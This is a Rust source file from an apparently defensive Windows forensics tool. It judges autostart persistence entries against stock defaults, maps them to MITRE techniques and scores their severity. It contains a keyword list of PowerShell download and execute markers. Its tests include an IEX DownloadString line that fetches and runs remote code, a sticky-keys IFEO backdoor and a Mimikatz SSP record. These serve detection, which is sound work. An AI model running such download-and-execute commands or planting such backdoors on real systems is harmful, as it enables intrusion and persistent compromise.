//! Judgement for the extended autostart catalog (cairn-collectors::asep): which
//! entries are normal for a stock Windows install, which MITRE technique each
//! mechanism maps to, and how severe a non-default entry is. Pure logic.
//!
//! Three kinds of mechanism:
//! - **absent by default** — any entry at all is unusual (AppInit/AppCert DLLs,
//!   cmd AutoRun, SilentProcessExit, Office Test, logon script, policy Run, MPNotify);
//! - **default list** — Windows ships known entries; anything else is unusual
//!   (LSA packages, BootExecute, netsh helpers, print monitors, time providers);
//! - **content** — PowerShell profiles are judged by what the script does.
//!
//! Mechanisms not listed here (Active Setup, COM hijack, screensaver, Winlogon
//! Notify, WOW64 Run keys) rely on persist.rs's generic path/signature signals.
use crate::persist::GateHit;
use crate::trust::{is_masquerade, is_under_windows_tree, is_user_writable_path};
use cairn_core::record::PersistenceRecord;
use cairn_core::Severity;

/// MITRE ATT&CK technique for every persistence mechanism cairn collects.
pub fn mechanism_mitre(mechanism: &str) -> &'static str {
    match mechanism {
        "run_key" | "startup" | "explorer_policy_run" | "boot_execute" => "T1547.001",
        "lsa_auth_package" => "T1547.002",
        "time_provider" => "T1547.003",
        "winlogon" | "winlogon_notify" | "winlogon_mpnotify" => "T1547.004",
        "lsa_security_package" => "T1547.005",
        "print_monitor" => "T1547.010",
        "active_setup" => "T1547.014",
        "service" => "T1543.003",
        "scheduled_task" => "T1053.005",
        "screensaver" => "T1546.002",
        "wmi_subscription" => "T1546.003",
        "netsh_helper" => "T1546.007",
        "appcert_dlls" => "T1546.009",
        "appinit_dlls" => "T1546.010",
        "ifeo" | "silent_exit_monitor" => "T1546.012",
        "ps_profile" => "T1546.013",
        "com_hijack" => "T1546.015",
        "cmd_autorun" => "T1546",
        "office_test" => "T1137.002",
        "logon_script" => "T1037.001",
        "lsa_notification_package" => "T1556.002",
        _ => "T1547",
    }
}

/// Mechanisms where Windows ships no entries: any value is worth review.
const ABSENT_BY_DEFAULT: &[&str] = &[
    "appinit_dlls",
    "appcert_dlls",
    "cmd_autorun",
    "silent_exit_monitor",
    "office_test",
    "logon_script",
    "explorer_policy_run",
    "winlogon_mpnotify",
];

/// Stock LSA Authentication Packages.
const LSA_AUTH_DEFAULTS: &[&str] = &["msv1_0"];
/// Stock LSA Security Packages across Windows 10/11 and Server 2016+. `""` is the
/// literal two-quote placeholder Windows stores when the list is empty.
const LSA_SECURITY_DEFAULTS: &[&str] = &[
    "kerberos",
    "msv1_0",
    "schannel",
    "wdigest",
    "tspkg",
    "pku2u",
    "cloudap",
    "livessp",
    "negoexts",
    "negotiate",
    "\"\"",
];
/// Stock password-filter / notification packages.
const LSA_NOTIFICATION_DEFAULTS: &[&str] = &["scecli", "rassfm"];
/// Stock netsh helper DLLs (file names).
const NETSH_DEFAULTS: &[&str] = &[
    "authfwcfg.dll",
    "dhcpcmonitor.dll",
    "dot3cfg.dll",
    "fwcfg.dll",
    "hnetmon.dll",
    "ifmon.dll",
    "napmontr.dll",
    "netiohlp.dll",
    "nettrace.dll",
    "nshhttp.dll",
    "nshipsec.dll",
    "nshwfp.dll",
    "p2pnetsh.dll",
    "peerdistsh.dll",
    "rasmontr.dll",
    "rpcnsh.dll",
    "wcnnetsh.dll",
    "whhelper.dll",
    "wlancfg.dll",
    "wshelper.dll",
    "wwancfg.dll",
    "dhcpmonitor.dll",
    "ipmontr.dll",
    "ippromon.dll",
];
/// Stock port-monitor DLLs (file names).
const PRINT_MONITOR_DEFAULTS: &[&str] = &[
    "localspl.dll",
    "tcpmon.dll",
    "usbmon.dll",
    "wsdmon.dll",
    "apmon.dll",
    "appmon.dll",
    "fxsmon.dll",
    "pjlmon.dll",
];
/// Stock time-provider DLLs (file names).
const TIME_PROVIDER_DEFAULTS: &[&str] = &["w32time.dll", "vmictimeprovider.dll"];

/// Accessibility binaries reachable from the logon screen; an IFEO debugger on one
/// of them is the classic "sticky keys" backdoor (T1546.008).
pub const ACCESSIBILITY_BINARIES: &[&str] = &[
    "sethc.exe",
    "utilman.exe",
    "osk.exe",
    "magnify.exe",
    "narrator.exe",
    "displayswitch.exe",
    "atbroker.exe",
];

fn file_name(path: &str) -> String {
    path.trim_matches('"')
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_ascii_lowercase()
}

/// True if this entry is part of a stock Windows install for its mechanism. Only
/// meaningful for default-list mechanisms; others return false.
fn is_stock_entry(p: &PersistenceRecord) -> bool {
    let item = p
        .command
        .as_deref()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    let path = p.binary_path.as_deref().unwrap_or("");
    // A stock DLL must also resolve under the Windows tree: "C:\Temp\localspl.dll"
    // is not the stock print monitor.
    let stock_file =
        |list: &[&str]| list.contains(&file_name(path).as_str()) && is_under_windows_tree(path);
    match p.mechanism.as_str() {
        "lsa_auth_package" => LSA_AUTH_DEFAULTS.contains(&item.as_str()),
        "lsa_security_package" => LSA_SECURITY_DEFAULTS.contains(&item.as_str()),
        "lsa_notification_package" => LSA_NOTIFICATION_DEFAULTS.contains(&item.as_str()),
        "boot_execute" => item.starts_with("autocheck autochk"),
        "netsh_helper" => stock_file(NETSH_DEFAULTS),
        "print_monitor" => stock_file(PRINT_MONITOR_DEFAULTS),
        "time_provider" => stock_file(TIME_PROVIDER_DEFAULTS),
        _ => false,
    }
}

fn is_default_list_mechanism(m: &str) -> bool {
    matches!(
        m,
        "lsa_auth_package"
            | "lsa_security_package"
            | "lsa_notification_package"
            | "boot_execute"
            | "netsh_helper"
            | "print_monitor"
            | "time_provider"
    )
}

/// Untrusted target: explicitly unsigned, in a user-writable drop zone, or a
/// system-name masquerade.
fn untrusted_target(p: &PersistenceRecord) -> bool {
    let path = p.binary_path.as_deref().unwrap_or("");
    p.signed == Some(false) || is_user_writable_path(path) || is_masquerade(path)
}

/// Download / encoded-payload markers in a script body (PowerShell profiles).
fn suspicious_script_markers(text: &str) -> Vec<&'static str> {
    const MARKERS: &[(&str, &str)] = &[
        ("downloadstring", "DownloadString"),
        ("downloadfile", "DownloadFile"),
        ("invoke-webrequest", "Invoke-WebRequest"),
        ("iwr ", "iwr"),
        ("invoke-expression", "Invoke-Expression"),
        ("iex ", "iex"),
        ("iex(", "iex"),
        ("frombase64string", "FromBase64String"),
        (" -enc", "-EncodedCommand"),
        ("start-bitstransfer", "Start-BitsTransfer"),
        ("http://", "http URL"),
        ("https://", "https URL"),
    ];
    let lower = text.to_ascii_lowercase();
    let mut found: Vec<&'static str> = MARKERS
        .iter()
        .filter(|(needle, _)| lower.contains(needle))
        .map(|(_, label)| *label)
        .collect();
    found.dedup();
    found
}

/// Mechanism-specific gate signal for the extended catalog, IFEO accessibility
/// backdoors and PowerShell profiles. None = no mechanism-specific signal (the generic
/// path/signature signals in persist.rs still apply).
pub(crate) fn asep_signal(p: &PersistenceRecord) -> Option<GateHit> {
    let m = p.mechanism.as_str();
    let mitre = mechanism_mitre(m);
    let target = p
        .binary_path
        .as_deref()
        .or(p.command.as_deref())
        .unwrap_or("-");

    if m == "ifeo" {
        let image = p.value.as_deref().unwrap_or("").to_ascii_lowercase();
        if ACCESSIBILITY_BINARIES.contains(&image.as_str()) {
            return Some(GateHit {
                severity: Severity::High,
                label: "協助工具後門（IFEO）",
                reason: format!(
                    "IFEO Debugger on accessibility binary {image} (reachable from the logon \
                     screen without signing in): {}",
                    p.command.as_deref().unwrap_or("-")
                ),
                mitre: "T1546.008",
            });
        }
        return None;
    }

    if m == "ps_profile" {
        let markers = suspicious_script_markers(p.command.as_deref().unwrap_or(""));
        if markers.is_empty() {
            return None;
        }
        return Some(GateHit {
            severity: Severity::High,
            label: "PowerShell 設定檔含下載或編碼內容",
            reason: format!(
                "PowerShell profile {} runs at every PowerShell start and contains {}",
                p.location,
                markers.join(", ")
            ),
            mitre,
        });
    }

    let severity = if untrusted_target(p) {
        Severity::High
    } else {
        Severity::Medium
    };

    if ABSENT_BY_DEFAULT.contains(&m) {
        return Some(GateHit {
            severity,
            label: absent_label(m),
            reason: format!(
                "{m} has an entry, but stock Windows ships none ({}): {target}",
                p.location
            ),
            mitre,
        });
    }

    if is_default_list_mechanism(m) && !is_stock_entry(p) {
        return Some(GateHit {
            severity,
            label: default_list_label(m),
            reason: format!(
                "{m} entry is not part of a stock Windows install ({}): {}",
                p.location,
                p.command.as_deref().unwrap_or("-")
            ),
            mitre,
        });
    }

    None
}

fn absent_label(m: &str) -> &'static str {
    match m {
        "appinit_dlls" => "AppInit_DLLs 載入 DLL",
        "appcert_dlls" => "AppCertDlls 載入 DLL",
        "cmd_autorun" => "cmd.exe AutoRun 指令",
        "silent_exit_monitor" => "SilentProcessExit 監視程式",
        "office_test" => "Office Test 機碼載入 DLL",
        "logon_script" => "使用者登入腳本",
        "explorer_policy_run" => "原則 Run 機碼自動執行",
        "winlogon_mpnotify" => "Winlogon MPNotify 程式",
        _ => "非預設自動執行項目",
    }
}

fn default_list_label(m: &str) -> &'static str {
    match m {
        "lsa_auth_package" => "非預設 LSA 驗證套件",
        "lsa_security_package" => "非預設 LSA 安全性套件",
        "lsa_notification_package" => "非預設密碼篩選器",
        "boot_execute" => "非預設 BootExecute 程式",
        "netsh_helper" => "非預設 netsh helper DLL",
        "print_monitor" => "非預設列印監視器",
        "time_provider" => "非預設時間提供者",
        _ => "非預設自動執行項目",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rec(
        mechanism: &str,
        value: &str,
        command: &str,
        binary_path: Option<&str>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism: mechanism.into(),
            location: format!(r"HKLM\...\{mechanism}"),
            value: Some(value.into()),
            command: Some(command.into()),
            binary_path: binary_path.map(str::to_string),
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: None,
        }
    }

    #[test]
    fn stock_lsa_packages_are_not_flagged() {
        for pkg in [
            "kerberos", "msv1_0", "schannel", "wdigest", "tspkg", "pku2u", "cloudap",
        ] {
            let p = rec("lsa_security_package", "Security Packages", pkg, None);
            assert!(asep_signal(&p).is_none(), "{pkg}");
        }
        let p = rec(
            "lsa_auth_package",
            "Authentication Packages",
            "msv1_0",
            None,
        );
        assert!(asep_signal(&p).is_none());
    }

    /// mimilib registered as an SSP is the classic Mimikatz persistence (T1547.005).
    #[test]
    fn unknown_security_package_is_flagged() {
        let p = rec(
            "lsa_security_package",
            "Security Packages",
            "mimilib",
            Some(r"C:\Windows\System32\mimilib.dll"),
        );
        let hit = asep_signal(&p).expect("non-stock SSP must gate");
        assert_eq!(hit.mitre, "T1547.005");
        assert_eq!(hit.severity, Severity::Medium);
    }

    #[test]
    fn unsigned_non_stock_entry_is_high() {
        let mut p = rec(
            "lsa_notification_package",
            "Notification Packages",
            "evilfilter",
            Some(r"C:\Windows\System32\evilfilter.dll"),
        );
        p.signed = Some(false);
        let hit = asep_signal(&p).unwrap();
        assert_eq!(hit.severity, Severity::High);
        assert_eq!(hit.mitre, "T1556.002");
    }

    #[test]
    fn stock_boot_execute_is_not_flagged_but_extra_is() {
        let p = rec("boot_execute", "BootExecute", "autocheck autochk *", None);
        assert!(asep_signal(&p).is_none());
        let p = rec("boot_execute", "BootExecute", r"\??\C:\Temp\x.exe", None);
        assert_eq!(asep_signal(&p).unwrap().mitre, "T1547.001");
    }

    /// A stock DLL name outside the Windows tree is not the stock DLL.
    #[test]
    fn stock_name_outside_windows_is_flagged() {
        let p = rec(
            "print_monitor",
            "Local Port",
            r"C:\Users\Public\localspl.dll",
            Some(r"C:\Users\Public\localspl.dll"),
        );
        let hit = asep_signal(&p).unwrap();
        assert_eq!(hit.severity, Severity::High, "user-writable path => High");
        assert_eq!(hit.mitre, "T1547.010");
        let ok = rec(
            "print_monitor",
            "Local Port",
            "localspl.dll",
            Some(r"C:\Windows\System32\localspl.dll"),
        );
        assert!(asep_signal(&ok).is_none());
    }

    #[test]
    fn any_absent_by_default_entry_is_flagged() {
        for m in ABSENT_BY_DEFAULT {
            let p = rec(m, "x", r"C:\Tools\x.exe", Some(r"C:\Tools\x.exe"));
            let hit = asep_signal(&p).unwrap_or_else(|| panic!("{m} must gate"));
            assert_eq!(hit.mitre, mechanism_mitre(m));
        }
    }

    #[test]
    fn ifeo_on_accessibility_binary_is_t1546_008() {
        let p = rec("ifeo", "sethc.exe", r"C:\Windows\System32\cmd.exe", None);
        let hit = asep_signal(&p).unwrap();
        assert_eq!(hit.mitre, "T1546.008");
        assert_eq!(hit.severity, Severity::High);
        let p = rec("ifeo", "notepad.exe", r"C:\Tools\npp.exe", None);
        assert!(
            asep_signal(&p).is_none(),
            "generic IFEO handled by persist.rs"
        );
    }

    #[test]
    fn ps_profile_judged_by_content() {
        let benign = rec(
            "ps_profile",
            "profile.ps1",
            "Set-Alias ll Get-ChildItem",
            None,
        );
        assert!(asep_signal(&benign).is_none());
        let bad = rec(
            "ps_profile",
            "profile.ps1",
            "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
            None,
        );
        let hit = asep_signal(&bad).unwrap();
        assert_eq!(hit.mitre, "T1546.013");
        assert!(hit.reason.contains("DownloadString"));
    }

    /// Generic-signal mechanisms get no mechanism-specific hit.
    #[test]
    fn generic_mechanisms_have_no_specific_signal() {
        for m in [
            "active_setup",
            "com_hijack",
            "screensaver",
            "winlogon_notify",
            "run_key",
        ] {
            let p = rec(
                m,
                "x",
                r"C:\Windows\System32\x.exe",
                Some(r"C:\Windows\System32\x.exe"),
            );
            assert!(asep_signal(&p).is_none(), "{m}");
        }
    }

    /// End to end through PersistHeuristic: a non-stock SSP becomes a Finding with its
    /// technique and a reason; a stock one stays inventory (an Observation).
    #[test]
    fn persist_heuristic_turns_non_stock_ssp_into_a_finding() {
        use cairn_core::record::Record;
        use cairn_core::traits::Analyzer;
        let bad = rec(
            "lsa_security_package",
            "Security Packages",
            "mimilib",
            Some(r"C:\Windows\System32\mimilib.dll"),
        );
        let good = rec(
            "lsa_security_package",
            "Security Packages",
            "kerberos",
            Some(r"C:\Windows\System32\kerberos.dll"),
        );
        let records = vec![Record::Persistence(bad), Record::Persistence(good)];
        let h = crate::PersistHeuristic;
        let findings = h.analyze(&records, &[]).unwrap();
        assert_eq!(findings.len(), 1);
        assert!(findings[0].mitre.contains(&"T1547.005".to_string()));
        assert!(findings[0].reason.as_deref().unwrap().contains("mimilib"));
        let obs = h.observe(&records).unwrap();
        assert_eq!(obs.len(), 1, "stock kerberos stays inventory");
    }

    #[test]
    fn every_mechanism_has_a_specific_technique() {
        for m in [
            "run_key",
            "service",
            "scheduled_task",
            "wmi_subscription",
            "ifeo",
            "startup",
            "winlogon",
            "explorer_policy_run",
            "boot_execute",
            "lsa_auth_package",
            "lsa_security_package",
            "lsa_notification_package",
            "time_provider",
            "winlogon_notify",
            "winlogon_mpnotify",
            "print_monitor",
            "active_setup",
            "screensaver",
            "netsh_helper",
            "appcert_dlls",
            "appinit_dlls",
            "silent_exit_monitor",
            "com_hijack",
            "cmd_autorun",
            "office_test",
            "logon_script",
            "ps_profile",
        ] {
            assert!(mechanism_mitre(m).starts_with('T'), "{m}");
        }
    }
}
